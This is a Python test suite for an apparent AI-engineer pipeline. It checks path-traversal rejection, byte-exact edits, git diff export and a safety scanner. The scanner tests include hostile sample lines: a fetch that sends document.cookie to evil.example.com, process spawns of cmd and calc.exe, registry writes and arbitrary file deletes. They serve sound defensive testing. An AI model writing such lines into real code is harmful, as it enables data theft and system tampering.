"""Tests for tools/mm_engineer.py (the MiniMax engineer pipeline). Plain python, no pytest, no network, no game:  python tests/test_mm_engineer.py

Everything runs against a SANDBOX repo in a temp dir (a tiny python project with an injected bug, see tools/engineer-sim.py), a scripted mock
chat function and fake runner/deploy/health hooks. The real repo, the agent dir, Trainer\\bin and the game are never touched.
"""
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import random
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

sys.dont_write_bytecode = True
HERE = Path(__file__).resolve().parent
TOOLS = HERE.parent / "tools"
sys.path.insert(0, str(TOOLS))
import mm_engineer as me  # noqa: E402

_spec = importlib.util.spec_from_file_location("engineer_sim", str(TOOLS / "engineer-sim.py"))
sim = importlib.util.module_from_spec(_spec)
sys.modules["engineer_sim"] = sim
_spec.loader.exec_module(sim)

FAILS = []
COUNT = [0]
T0 = time.time()


def check(name, cond, detail=""):
    COUNT[0] += 1
    print("[%s] %s%s" % ("PASS" if cond else "FAIL", name, ("  " + str(detail)[:400]) if detail and not cond else ""))
    if not cond:
        FAILS.append(name)


def sha(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


class Clock:
    def __init__(self, t=1_800_000_000.0):
        self.t = t

    def __call__(self):
        return self.t


# ---------------------------------------------------------------------------------------------------------------- fakes
class FastRunner:
    """In-process stand-in for the runner: evaluates src/picker.py the way tests/test_picker.py would (no subprocess), plus the wall-clock lint rule."""

    def __init__(self):
        self.build_calls, self.test_calls = [], []
        self.fail_build_roots = set()
        self.on_test = None
        self.on_build = None

    def build(self, root, out_dir=None, timeout=None):
        root = Path(root)
        self.build_calls.append(str(root))
        if self.on_build:
            self.on_build(root)
        if str(root) in self.fail_build_roots:
            return {"ok": False, "errors": ["src/picker.py(1,1): error CS0000: injected build failure"], "seconds": 0.0, "error": ""}
        for p in sorted((root / "src").rglob("*.py")):
            try:
                compile(p.read_bytes(), str(p), "exec", dont_inherit=True)
            except SyntaxError as ex:
                return {"ok": False, "errors": ["%s(%s,%s): error SyntaxError: %s" % (p.relative_to(root).as_posix(), ex.lineno, ex.offset, ex.msg)], "seconds": 0.0, "error": ""}
        return {"ok": True, "errors": [], "seconds": 0.01, "error": ""}

    def test(self, root, timeout=None):
        root = Path(root)
        self.test_calls.append(str(root))
        if self.on_test:
            self.on_test(root)
        text = (root / "src" / "picker.py").read_text(encoding="utf-8")
        ns = {}
        sites = [{"id": "a", "pos": (1, 0)}, {"id": "b", "pos": (5, 0)}, {"id": "c", "pos": (9, 0)}]
        hero = (0, 0)
        try:
            # test-only: evaluates the scripted sandbox module (content written by this test file / the scripted mock model, never external input)
            exec(compile(text, "picker.py", "exec"), ns)
        except Exception as ex:
            return {"ok": False, "passed": 0, "failed": 1, "failures": ["unittest: import"], "details": {"unittest: import": repr(ex)}, "lint_fails": [], "error": ""}
        checks = {
            "test_nearest_site_wins": lambda: ns["pick_next"](hero, sites, set())["id"] == "a",
            "test_no_sites": lambda: ns["pick_next"](hero, [], set()) is None,
            "test_skips_blocked_site": lambda: ns["pick_next"](hero, sites, {"a"})["id"] == "b",
            "test_all_blocked_returns_none": lambda: ns["pick_next"](hero, sites, {"a", "b", "c"}) is None,
            "test_pick_many_skips_blocked": lambda: [s["id"] for s in ns["pick_many"](hero, sites, {"b"}, 5)] == ["a", "c"],
            "test_pick_many_limit": lambda: len(ns["pick_many"](hero, sites, set(), 2)) == 2,
        }
        failures, details = [], {}
        for name, fn in checks.items():
            try:
                ok = fn()
                why = "assertion failed"
            except Exception as ex:
                ok, why = False, "%s: %s" % (type(ex).__name__, ex)
            if not ok:
                failures.append("unittest: test_picker.PickerTests." + name)
                details[failures[-1]] = why
        lint = []
        if "time.time()" in text:
            lint = ["lint: no-wallclock"]
            failures += lint
            details[lint[0]] = "src uses time.time()"
        return {"ok": not failures, "passed": len(checks) - len([f for f in failures if f.startswith("unittest")]), "failed": len(failures), "failures": failures,
                "details": details, "lint_fails": lint, "lint_warns": [], "error": ""}


class Deployer:
    """fake deploy/health/restore hooks around a fake 'deployed DLL' file"""

    def __init__(self, dll):
        self.dll = Path(dll)
        self.dll.write_bytes(b"OLD-DLL")
        self.deploys, self.restores, self.health_ctx = 0, [], []
        self.deploy_result = {"ok": True}
        self.health_result = (True, "audit.json fresh, caps.json new")
        self.deploy_raises = None
        self.write_dll = True

    def deploy(self):
        self.deploys += 1
        if self.write_dll:
            self.dll.write_bytes(b"NEW-DLL")
        if self.deploy_raises:
            raise self.deploy_raises
        return self.deploy_result

    def health(self, ctx):
        self.health_ctx.append(ctx)
        return self.health_result

    def restore(self, backup):
        self.restores.append(backup)
        shutil.copyfile(backup, self.dll)
        return {"ok": True, "detail": "restored"}


A_LS = {"action": "ls", "path": "src"}
FIX = {"action": "edit", "path": "src/picker.py", "old": sim.FIX_OLD, "new": sim.FIX_NEW}
BUILD = {"action": "build"}
TEST = {"action": "test"}
FINISH = {"action": "finish", "summary": "pick_next skips blocked sites"}
HAPPY = [FIX, BUILD, TEST, FINISH]


class Env:
    def __init__(self, base, name, replies=None, cfg=None, runner=None, clock=None, tasks=None, extra_files=None, chat=None, deployer=None, advance=0.0, tokens=600, crlf_tabs=False):
        self.dir = Path(base) / name
        self.repo = sim.make_sandbox(self.dir / "repo", crlf_tabs=crlf_tabs)
        for rel, text in (extra_files or {}).items():
            p = self.repo / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(text if isinstance(text, bytes) else text.encode("utf-8"))
        self.agent = self.dir / "agent"
        sim.write_queue(self.agent, tasks or [dict(sim.TASK)])
        self.clock = clock or Clock()
        self.chat = chat or sim.ScriptedChat(replies or [], clock=self.clock, advance=advance, tokens=tokens)
        self.runner = runner or FastRunner()
        self.logs = []
        self.deployer = deployer or Deployer(self.dir / "ThronefallTrainer.dll")
        c = sim.sandbox_cfg(deployed_dll=str(self.deployer.dll), health_fresh_s=20)
        c.update(cfg or {})
        self.cfg = c
        self.eng = self.make(self.repo)

    def make(self, repo):
        return me.Engineer(str(repo), str(self.agent), self.chat, cfg=self.cfg, runner=self.runner, clock=self.clock, log=self.logs.append, sleep=lambda s: None,
                           deploy_fn=self.deployer.deploy, health_fn=self.deployer.health, restore_fn=self.deployer.restore)

    def real(self):
        """a COPY of the sandbox acting as the live tree, plus an Engineer pointed at it (same agent dir)"""
        if not hasattr(self, "_real"):
            self._real = self.dir / "real"
            shutil.copytree(self.repo, self._real)
            self.eng_real = self.make(self._real)
        return self._real, self.eng_real

    def rec(self, tid="E0003"):
        return json.loads((self.agent / "engineer-status.json").read_text(encoding="utf-8")).get(tid, {})

    def obs(self, call_index):
        """the last message (the observation) the model was shown on call #call_index (1-based)"""
        return self.chat.calls[call_index - 1]["messages"][-1]["content"]


def patched_env(base, name, **kw):
    env = Env(base, name, replies=list(HAPPY), **kw)
    res = env.eng.run_task("E0003")
    assert res["status"] == "patched", res
    return env


# ================================================================================================================ A. path policy
def test_path_policy(tmp):
    bad = {"../x": "dotdot", "src/../../x": "dotdot", "/etc/passwd": "abs posix", "C:\\Windows\\x": "abs win", "\\\\server\\share\\x": "unc", "a/b/../../..": "dotdot",
           "src/a.cs:evil": "ads", "con": "reserved", "src/nul.txt": "reserved", "src/x\x01y": "control", "": "empty", "src/trailing.": "trailing dot"}
    ok = True
    for p, why in bad.items():
        try:
            me.norm_rel(p)
            ok = False
            print("   not rejected:", repr(p), why)
        except me.PolicyError:
            pass
    check("path policy: traversal / absolute / UNC / ADS / reserved / control / empty are rejected", ok)
    aliases = ["tools/MM_ENG~1.PY", "src/PICKER~2.CS", "src/pıcker.py", "src/café.cs", "src/a​.cs", "src/a|b.cs", "src/x?.cs", "src/conin$", "src/<x>.cs"]
    leaked = []
    for p in aliases:
        try:
            me.norm_rel(p)
            leaked.append(p)
        except me.PolicyError:
            pass
    check("path policy: 8.3 short names (~1), non-ASCII lookalikes (dotless i on NTFS), invisible characters and Windows-invalid characters are rejected - they could alias a protected file", not leaked, leaked)
    check("path policy: backslashes and ./ are normalised", me.norm_rel(".\\src\\\\picker.py") == "src/picker.py" and me.norm_rel("./src//a.cs") == "src/a.cs" and me.norm_rel(".") == ".")
    ws_root = Path(tmp) / "pp" / "work"
    base_root = Path(tmp) / "pp" / "base"
    sim.make_sandbox(ws_root)
    sim.make_sandbox(base_root)
    ws = me.Workspace(ws_root, base_root, dict(me.DEFAULT_CFG))
    for forb in (".git/config", ".GIT/HEAD", "src/bin/x.dll", "obj/a", "src/obj/b", "decompiled/x.cs", "decompiled_fog/y", "dist/z", "reference/r", "tools/__pycache__/m.pyc", "node_modules/q"):
        try:
            ws.safe_path(forb)
            check("path policy: forbidden location rejected for reading: " + forb, False)
        except me.PolicyError:
            pass
    check("path policy: .git / bin / obj / decompiled* / dist / reference / __pycache__ / node_modules are off limits (case-insensitive)", True)
    wr = {"README.md": "root file", "Makefile": "root file", "bin/x.cs": "forbidden", "tools/bot-lint.ps1": "protected", "tools/mm_engineer.py": "protected", "tests/test_mm_engineer.py": "protected",
          "tools/build-and-deploy.ps1": "protected", "src/evil.ps1": "script ext", "tools/run.bat": "script ext", "src/x.dll": "binary ext", "tools/x.sh": "script ext"}
    ok, miss = True, []
    for p in wr:
        try:
            ws.safe_path(p, write=True)
            ok = False
            miss.append(p)
        except me.PolicyError:
            pass
    check("path policy: writes outside src/ tests/ tools/ docs/, protected gate/deploy files and scripts/binaries are refused", ok, miss)
    try:
        ws.safe_path("src/picker.py", write=True)
        ws.safe_path("tools/coach-server.py", write=True)
        ws.safe_path("docs/new/NOTES2.md", write=True)
        check("path policy: allowed edit roots accept normal files (incl. tools/coach-server.py)", True)
    except me.PolicyError as ex:
        check("path policy: allowed edit roots accept normal files (incl. tools/coach-server.py)", False, ex)
    # symlink / junction escape
    outside = Path(tmp) / "pp" / "outside"
    outside.mkdir(parents=True, exist_ok=True)
    (outside / "secret.txt").write_text("top secret\n")
    link = ws_root / "src" / "evil"
    made = False
    try:
        os.symlink(str(outside), str(link), target_is_directory=True)
        made = True
    except (OSError, NotImplementedError, AttributeError):
        r = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(outside)], capture_output=True, text=True) if os.name == "nt" else None
        made = bool(r and r.returncode == 0)
    if made:
        res = []
        for fn in (lambda: ws.read("src/evil/secret.txt"), lambda: ws.edit("src/evil/secret.txt", "top", "TOP"), lambda: ws.ls("src/evil"), lambda: ws.create("src/evil/new.txt", "x\n")):
            try:
                fn()
                res.append(False)
            except me.PolicyError:
                res.append(True)
        check("path policy: symlink/junction inside the workspace cannot be read, edited, listed or written through", all(res), res)
        check("path policy: the file outside the workspace is untouched", (outside / "secret.txt").read_text() == "top secret\n" and not (outside / "new.txt").exists())
        # copy_repo must not follow it either
        src_repo = Path(tmp) / "pp" / "linkrepo"
        (src_repo / "src").mkdir(parents=True)
        (src_repo / "src" / "a.py").write_text("x = 1\n")
        link2 = src_repo / "src" / "lnk"
        try:
            os.symlink(str(outside), str(link2), target_is_directory=True)
        except (OSError, NotImplementedError):
            subprocess.run(["cmd", "/c", "mklink", "/J", str(link2), str(outside)], capture_output=True)
        st = me.copy_repo(src_repo, Path(tmp) / "pp" / "linkcopy", dict(me.DEFAULT_CFG))
        check("copy_repo: links are not followed", not (Path(tmp) / "pp" / "linkcopy" / "src" / "lnk").exists() and (Path(tmp) / "pp" / "linkcopy" / "src" / "a.py").exists())
        for l in (link, link2):
            try:
                os.rmdir(l)
            except OSError:
                try:
                    os.remove(l)
                except OSError:
                    pass
    else:
        check("path policy: symlink/junction test SKIPPED (no privilege to create links here)", True)
        check("copy_repo: links are not followed (SKIPPED, no links)", True)


# ================================================================================================================ B. workspace actions
def make_ws(tmp, name, files=None, cfg=None):
    root = Path(tmp) / name
    sim.make_sandbox(root / "work")
    sim.make_sandbox(root / "base")
    for rel, data in (files or {}).items():
        for side in ("work", "base"):
            p = root / side / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(data if isinstance(data, bytes) else data.encode())
    c = dict(me.DEFAULT_CFG)
    c.update(cfg or {})
    return me.Workspace(root / "work", root / "base", c), root


def test_workspace_edit_semantics(tmp):
    ws, root = make_ws(tmp, "ws1")
    p = root / "work" / "src" / "picker.py"
    info = ws.edit("src/picker.py", sim.FIX_OLD, sim.FIX_NEW)
    check("edit: a unique old text is replaced; the report carries the line number and sizes", info["line"] == 17 and info["removed"] == 3 and info["added"] == 5 and "if site[\"id\"] in blocked" in p.read_text())
    try:
        ws.edit("src/picker.py", "best = site", "best = site  # x")
        check("edit: non-unique old text is rejected", False)
    except me.ActionError as ex:
        m = re.search(r"occurs (\d+) times \(lines ([\d, ]+)\)", str(ex))
        check("edit: non-unique old text is rejected with the occurrence count and the line numbers", bool(m) and m.group(1) == "2", ex)
    try:
        ws.edit("src/picker.py", "this text is nowhere", "x")
        check("edit: missing old text is rejected", False)
    except me.ActionError as ex:
        check("edit: missing old text is rejected with 'occurs 0 times'", "occurs 0 times" in str(ex), ex)
    try:
        ws.edit("src/picker.py", "    for site in sites:\n    if site[\"id\"] in blocked:", "x")
    except me.ActionError as ex:
        check("edit: a whitespace-only mismatch is diagnosed and the exact text is shown", "DIFFERENT WHITESPACE" in str(ex) and "for site in sites:" in str(ex), ex)
    for old, new, why in (("", "x", "empty old"), ("same", "same", "identical")):
        try:
            ws.edit("src/picker.py", old, new)
            check("edit: %s is rejected" % why, False)
        except me.ActionError:
            check("edit: %s is rejected" % why, True)
    try:
        ws.edit("src/missing.py", "a", "b")
        check("edit: a missing file is rejected", False)
    except me.ActionError as ex:
        check("edit: a missing file is rejected (points to create)", "create" in str(ex))
    # untouched-bytes guarantee: only the replaced region differs
    before = (root / "base" / "src" / "picker.py").read_bytes()
    after = p.read_bytes()
    check("edit: bytes outside the replaced region are identical", after.startswith(before[:before.index(b"    for site in sites:")]) and after.endswith(before[before.index(b"        d = dist(hero, site[\"pos\"])\n        if best is None or d < best_d:\n            best = site\n            best_d = d\n    return best"):]))

    # line endings and BOM
    crlf = b"alpha\r\nbeta\r\ngamma\r\ndelta\r\n"
    bom = b"\xef\xbb\xbfone\r\ntwo\r\nthree\r\n"
    mixed = b"m1\r\nm2\nm3\r\nm4\nm5\r\n"
    nonl = b"x = 1\r\ny = 2"
    ws2, root2 = make_ws(tmp, "ws2", {"src/crlf.cs": crlf, "src/bom.cs": bom, "src/mixed.cs": mixed, "src/nonl.cs": nonl})
    ws2.edit("src/crlf.cs", "beta\ngamma", "BETA\nNEW1\nNEW2\nGAMMA")
    got = (root2 / "work" / "src" / "crlf.cs").read_bytes()
    check("CRLF file: a multi-line edit written with \\n comes out with CRLF only (no bare LF)", got == b"alpha\r\nBETA\r\nNEW1\r\nNEW2\r\nGAMMA\r\ndelta\r\n", got)
    ws2.edit("src/bom.cs", "two", "TWO")
    got = (root2 / "work" / "src" / "bom.cs").read_bytes()
    check("BOM file: the BOM and CRLF are preserved", got == b"\xef\xbb\xbfone\r\nTWO\r\nthree\r\n", got)
    ws2.edit("src/mixed.cs", "m4\nm5", "M4\nM5")
    got = (root2 / "work" / "src" / "mixed.cs").read_bytes()
    check("mixed endings: untouched lines keep their own ending, the replaced region uses the local one", got.startswith(b"m1\r\nm2\nm3\r\n") and got.endswith(b"M5\r\n"), got)
    ws2.edit("src/nonl.cs", "y = 2", "y = 3")
    check("no trailing newline is preserved", (root2 / "work" / "src" / "nonl.cs").read_bytes() == b"x = 1\r\ny = 3")
    ws2.edit("src/nonl.cs", "y = 3", "y = 3\nz = 4")
    check("appending after an unterminated last line uses the file's CRLF", (root2 / "work" / "src" / "nonl.cs").read_bytes() == b"x = 1\r\ny = 3\r\nz = 4")
    out = ws2.read("src/crlf.cs", 1, 3)
    check("read: CRLF files are shown without CRs and flagged", "\r" not in out and "CRLF" in out and "    2| BETA" in out, out)

    # property: any unique edit leaves every other byte alone
    rnd = random.Random(7)
    good = 0
    for _ in range(150):
        parts = []
        for i in range(rnd.randint(2, 9)):
            parts.append("tok%d" % i)
            parts.append(rnd.choice(["\n", "\r\n", " ", "\r\n"]))
        raw = "".join(parts).encode()
        tf = me.TextFile(raw)
        a = rnd.randint(0, len(tf.text) - 1)
        b = rnd.randint(a + 1, len(tf.text))
        old = tf.text[a:b]
        if len(me.find_all(tf.text, old)) != 1 or old == "ZZ":
            continue
        new_raw, _ = me.apply_edit(tf, old, "ZZ")
        # strip the replaced region back out: prefix and suffix must be byte-identical to the original raw prefix/suffix
        ra, rb = tf.raw_index(a), tf.raw_index(b)
        if new_raw.startswith(raw[:ra]) and new_raw.endswith(raw[rb:]):
            good += 1
    check("property: 150 random edits keep every byte outside the replaced span identical (CR/LF mixes)", good > 60, good)


def test_workspace_read_grep_ls_create(tmp):
    lines = "\n".join("line %d: %s" % (i, "x" * (i % 40)) for i in range(1, 501)) + "\n"
    longline = "short\n" + "Y" * 900 + "\nend\n"
    ws, root = make_ws(tmp, "ws3", {"src/big.cs": lines, "src/long.cs": longline, "src/bin.dat": b"\x00\x01\x02binary", "tools/crlf/sib1.cs": b"a\r\nb\r\n", "tools/crlf/sib2.cs": b"c\r\nd\r\n"})
    out = ws.read("src/big.cs", 10, 20)
    check("read: numbered lines with a header", out.startswith("src/big.cs: lines 10-20 of 500") and "   10| line 10:" in out and "   20| line 20:" in out, out[:200])
    out = ws.read("src/big.cs", 1, 500, max_chars=10 ** 6)
    check("read: a request for 500 lines is clamped to 220 (and says where to continue)", "lines 1-220 of 500" in out and "continue with start=221" in out and "  220| " in out and "  221| " not in out, out[:160])
    out = ws.read("src/big.cs", 480, 9999)
    check("read: end beyond EOF is clamped to the file length", "lines 480-500 of 500" in out)
    for fn, why in ((lambda: ws.read("src/big.cs", 900, 910), "start past EOF"), (lambda: ws.read("src"), "directory"), (lambda: ws.read("src/bin.dat"), "binary"), (lambda: ws.read("src/none.cs"), "missing"),
                    (lambda: ws.read("src/big.cs", 100, 50), "end before start")):
        try:
            fn()
            check("read: %s is an error" % why, False)
        except me.ActionError:
            check("read: %s is an error" % why, True)
    out = ws.read("src/long.cs")
    check("read: very long lines are cut with a marker", "...[+500 chars]" in out and len(out) < 1200, len(out))
    out = ws.read("src/big.cs", 1, 220, max_chars=1500)
    check("read: output is cut at the observation budget with a continuation hint", "output cut at line" in out and "continue with start=" in out and len(out) <= 1700, len(out))

    out = ws.grep("line 4[0-2]:", "src/*.cs")
    hits = [l for l in out.splitlines() if l.startswith("src/")]
    check("grep: regex hits come as file:line: text, filtered by glob", len(hits) >= 3 and hits[0].startswith("src/big.cs:40: line 40:") and "no matches" not in out, out[:300])
    out = ws.grep("^line", "src/big.cs", 999)
    hits = [l for l in out.splitlines() if l.startswith("src/")]
    check("grep: at most 40 hits are returned even if more are requested, with a 'more hits' note", len(hits) == 40 and "460 more hits not shown" in out and out.startswith("500 hit(s)"), out[:120])
    out = ws.grep("Y{100}", "src/long.cs")
    hit = [l for l in out.splitlines() if l.startswith("src/")][0]
    check("grep: hit lines are truncated to 160 chars (+ the marker)", len(hit) <= len("src/long.cs:2: ") + 160 + 30 and "truncated" in hit, len(hit))
    out = ws.grep("([a-z")
    check("grep: an invalid regex falls back to a literal search and says so", "not a valid regex" in out, out)
    try:
        ws.grep("(a+)+b")
        check("grep: nested quantifiers are refused", False)
    except me.ActionError:
        check("grep: nested quantifiers are refused (catastrophic backtracking)", True)
    check("grep: case-sensitive by default, ignore_case on request", "no matches" in ws.grep("DEF PICK_NEXT") and "1 hit(s)" in ws.grep("DEF PICK_NEXT", ignore_case=True))
    check("grep: a pattern with no hit says so", "no matches" in ws.grep("zzzzqqqq"))
    check("grep: binary files are skipped", "bin.dat" not in ws.grep("binary"))

    out = ws.ls("src")
    check("ls: lists files with size and line count", "picker.py" in out and "big.cs" in out and "500 lines" in out, out[:300])
    (root / "work" / "src" / "obj").mkdir()
    (root / "work" / "src" / "obj" / "junk.dll").write_bytes(b"x")
    check("ls: build output directories are hidden", "obj" not in ws.ls("src"))
    check("ls: the root shows the editable roots", all(d in ws.ls(".") for d in ("src/", "tests/", "tools/", "docs/")))

    info = ws.create("src/new_file.py", "x = 1\ny = 2")
    check("create: writes the file (adds a trailing newline) and reports the size", (root / "work" / "src" / "new_file.py").read_text() == "x = 1\ny = 2\n" and info["lines"] == 2)
    for args, why in ((("src/new_file.py", "again"), "an existing file"), (("README.md", "x"), "a root file"), (("src/e.py", "  \n"), "empty content"),
                      (("tools/bot-lint.ps1", "x"), "a protected file"), (("src/huge.py", "x" * 300000), "oversized content"), (("src/ev.ps1", "x"), "a script")):
        try:
            ws.create(*args)
            check("create: %s is refused" % why, False)
        except me.ActionError:
            check("create: %s is refused" % why, True)
    ws.create("tools/crlf/sib3.cs", "e\nf\n")
    check("create: the line-ending style follows the sibling files (CRLF here)", (root / "work" / "tools" / "crlf" / "sib3.cs").read_bytes() == b"e\r\nf\r\n")
    check("workspace: touched files are tracked; changed_files() lists what really differs from base", set(ws.touched) == {"src/new_file.py", "tools/crlf/sib3.cs"} and ws.changed_files() == ["src/new_file.py", "tools/crlf/sib3.cs"], ws.changed_files())
    (root / "work" / "src" / "new_file.py").unlink()
    (root / "base" / "src" / "new_file.py").write_bytes(b"x")
    (root / "base" / "src" / "new_file.py").unlink()
    check("workspace: a touched file that was removed again (equal to base: absent) is not a change", ws.changed_files() == ["tools/crlf/sib3.cs"], ws.changed_files())


def test_workspace_limits(tmp):
    ws, root = make_ws(tmp, "ws4", cfg={"max_changed_lines": 40, "max_files": 3})
    ws.create("src/a1.py", "\n".join("a%d = %d" % (i, i) for i in range(30)))
    try:
        ws.create("src/a2.py", "\n".join("b%d = %d" % (i, i) for i in range(30)))
        check("limits: an edit that pushes the patch over max_changed_lines is refused", False)
    except me.ActionError as ex:
        check("limits: an edit that pushes the patch over max_changed_lines is refused (and not written)", "limit 40" in str(ex) and not (root / "work" / "src" / "a2.py").exists(), ex)
    ws.create("src/a2.py", "b = 1")
    ws.create("src/a3.py", "c = 1")
    try:
        ws.create("src/a4.py", "d = 1")
        check("limits: a 4th file is refused when max_files is 3", False)
    except me.ActionError as ex:
        check("limits: a 4th file is refused when max_files is 3", "4 files" in str(ex) and "limit 3" in str(ex), ex)


# ================================================================================================================ C. diff export
def git_apply_check(dirpath, diff_bytes, check_only=True, autocrlf=None):
    dp = Path(dirpath) / "_p.diff"
    dp.write_bytes(diff_bytes)
    cmd = ["git"] + (["-c", "core.autocrlf=%s" % autocrlf] if autocrlf else []) + ["apply"] + (["--check"] if check_only else []) + ["--whitespace=nowarn", str(dp)]
    r = subprocess.run(cmd, cwd=str(dirpath), capture_output=True, text=True)
    return r.returncode, r.stderr


def test_diff_export(tmp):
    d = Path(tmp) / "diff1"
    d.mkdir()
    a = b"one\r\ntwo\r\nthree\r\nfour\r\nfive\r\nsix\r\nseven\r\neight\r\nnine\r\nten"
    (d / "a.txt").write_bytes(a)
    new_a, _ = me.apply_edit(me.TextFile(a), "five\nsix", "FIVE\nSIX\nXX")
    new_a, _ = me.apply_edit(me.TextFile(new_a), "ten", "ten\neleven")
    diff = me.make_file_diff("a.txt", a, new_a) + me.make_file_diff("sub/new.txt", None, b"hello\nworld\n")
    text = diff.decode()
    check("diff: git-style headers with a/ and b/ repo-relative paths", "diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n" in text and "diff --git a/sub/new.txt b/sub/new.txt\nnew file mode 100644\n--- /dev/null\n+++ b/sub/new.txt\n" in text)
    check("diff: header and hunk lines end with LF only", all(not l.endswith("\r") for l in text.split("\n") if l.startswith(("diff ", "--- ", "+++ ", "@@", "new file"))))
    check("diff: content lines keep their CRLF bytes (the diff is byte-exact)", b"-five\r\n" in diff and b"+FIVE\r\n" in diff and b" three\r\n" in diff)
    check("diff: a missing final newline is marked with '\\ No newline at end of file'", text.count("\\ No newline at end of file") == 2)
    for mode in ("true", "false", "input"):
        rc, err = git_apply_check(d, diff, True, mode)
        check("diff: `git apply --check` accepts it against the base tree (core.autocrlf=%s)" % mode, rc == 0, err)
    rc, err = git_apply_check(d, diff, False, "false")
    check("diff: applying it reproduces the edited file byte for byte", rc == 0 and (d / "a.txt").read_bytes() == new_a and (d / "sub" / "new.txt").read_bytes() == b"hello\nworld\n", err)
    files = me.parse_diff(diff)
    st = me.diff_stats(files)
    check("diff: parse_diff finds both files, the new-file flag and the added/removed counts", [f["path"] for f in files] == ["a.txt", "sub/new.txt"] and files[1]["new"] and st["added"] == 7 and st["removed"] == 3, st)
    check("diff: changed_lines counts added + removed", me.changed_lines(a, new_a) == 8 and me.changed_lines(a, a) == 0 and me.changed_lines(None, b"x\ny\n") == 2)
    check("diff: identical content gives an empty diff", me.make_file_diff("a.txt", a, a) == b"")
    sym = me.parse_diff(b"diff --git a/src/l.cs b/src/l.cs\nnew file mode 120000\n--- /dev/null\n+++ b/src/l.cs\n@@ -0,0 +1 @@\n+..\\..\\Windows\n")
    reg = me.parse_diff(b"diff --git a/src/l.cs b/src/l.cs\nnew file mode 100644\n--- /dev/null\n+++ b/src/l.cs\n@@ -0,0 +1 @@\n+x\n")
    check("parse_diff: only mode 100644 new files are regular; symlink (120000) / executable / submodule modes are marked special (apply refuses them)", sym[0]["special"] is True and reg[0]["special"] is False and reg[0]["new"] is True)
    try:
        me.parse_diff(b"diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1,3 +1,3 @@\n a\n-b\n")
        check("parse_diff: a truncated hunk is an error", False)
    except me.DiffError:
        check("parse_diff: a truncated hunk is an error", True)
    # random round trips through real git
    rnd = random.Random(11)
    ok = 0
    n = 5
    for i in range(n):
        dd = Path(tmp) / ("diff_rt%d" % i)
        dd.mkdir()
        eol = rnd.choice(["\n", "\r\n"])
        lines = ["line %d %s" % (k, "z" * rnd.randint(0, 20)) for k in range(rnd.randint(8, 40))]
        raw = eol.join(lines).encode() + (eol.encode() if rnd.random() < 0.7 else b"")
        (dd / "f.txt").write_bytes(raw)
        tf = me.TextFile(raw)
        text_ = tf.text
        cur = raw
        for _ in range(rnd.randint(1, 3)):
            tf = me.TextFile(cur)
            ln = rnd.choice([l for l in tf.text.split("\n") if l.strip()])
            if len(me.find_all(tf.text, ln)) == 1:
                cur, _i = me.apply_edit(tf, ln, ln.upper() + "\nextra-" + str(rnd.randint(0, 99)))
        dif = me.make_file_diff("f.txt", raw, cur)
        rc, err = git_apply_check(dd, dif, False, "false")           # the engineer applies with core.autocrlf=false (byte-exact)
        if rc == 0 and (dd / "f.txt").read_bytes() == cur:
            ok += 1
    check("diff: %d random edit/diff/git-apply round trips (LF and CRLF files, with and without a final newline) reproduce the bytes exactly" % n, ok == n, ok)


# ================================================================================================================ D. safety scan
def diff_for(path, added=(), removed=(), ctx=("{",)):
    body = "".join(" %s\n" % c for c in ctx) + "".join("-%s\n" % r for r in removed) + "".join("+%s\n" % a for a in added)
    n_old, n_new = len(ctx) + len(removed), len(ctx) + len(added)
    return ("diff --git a/%s b/%s\n--- a/%s\n+++ b/%s\n@@ -1,%d +1,%d @@\n%s" % (path, path, path, path, n_old, n_new, body)).encode()


LINT = "$cheatCalls = @(\n    @{ rx = 'pm\\.TeleportTo\\(';  name = 'tp' },\n    @{ rx = 'Hp\\.TakeDamage\\(';  name = 'dmg' }\n)\n"


def scan(path, added, removed=(), lint=LINT):
    return me.scan_diff(me.parse_diff(diff_for(path, added, removed)), lint)


def rules_of(res):
    return sorted({v["rule"] for v in res["violations"]})


def test_safety_scan(tmp):
    r = scan("src/Bot.cs", ["    System.Diagnostics.Process.Start(\"calc.exe\");"])
    check("scan: System.Diagnostics.Process.Start is rejected", "process-spawn" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    var p = Process.Start(psi);", "    var psi = new ProcessStartInfo(\"cmd\");"])
    check("scan: Process.Start / ProcessStartInfo are rejected", "process-spawn" in rules_of(r))
    r = scan("src/Bot.cs", ["    File.Delete(somePath);"])
    check("scan: File.Delete of an unknown path is rejected", "file-delete" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    File.Delete(Path.Combine(AgentDir, \"view.json.tmp\"));", "    File.Delete(path + \".tmp\");"])
    check("scan: File.Delete is fine when the target visibly is under the agent dir / a .tmp file", not r["violations"], r)
    r = scan("src/Bot.cs", ["    File.Delete(oops); File.Delete(Path.Combine(AgentDir, \"x\"));"])
    check("scan: every File.Delete call on a line must be visibly safe (one safe call does not excuse another)", "file-delete" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    Microsoft.Win32.Registry.SetValue(k, n, v);"])
    check("scan: registry access is rejected", "registry" in rules_of(r))
    r = scan("src/Bot.cs", ["    var w = new WebClient(); w.DownloadString(\"http://evil.example.com/x\");"])
    check("scan: WebClient to a non-localhost URL is rejected", "net-nonlocal" in rules_of(r), r)
    r = scan("src/Coach.cs", ["    var rq = (HttpWebRequest)WebRequest.Create(userSuppliedUrl);"])
    check("scan: a network call whose target cannot be seen is rejected", "net-nonlocal" in rules_of(r))
    r = scan("src/Coach.cs", ["    var rq = (HttpWebRequest)WebRequest.Create(\"http://127.0.0.1:8099/health\");", "    var h = new HttpClient(); h.GetAsync(\"http://localhost:8099/x\");"])
    check("scan: HttpWebRequest/HttpClient to 127.0.0.1 / localhost is allowed", not r["violations"], r)
    r = scan("tools/cc.js", ["  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'path');", "  fetch('/health');"])
    check("scan: XML/SVG namespace URLs and relative fetches are not network targets", not r["violations"], r)
    r = scan("tools/cc.js", ["  fetch('https://evil.example.com/steal?x=' + document.cookie);"])
    check("scan: a fetch to an external URL in the UI code is rejected", "net-nonlocal" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    var w = new WebClient(); w.DownloadString(\"http://www.w3.org/x\");"])
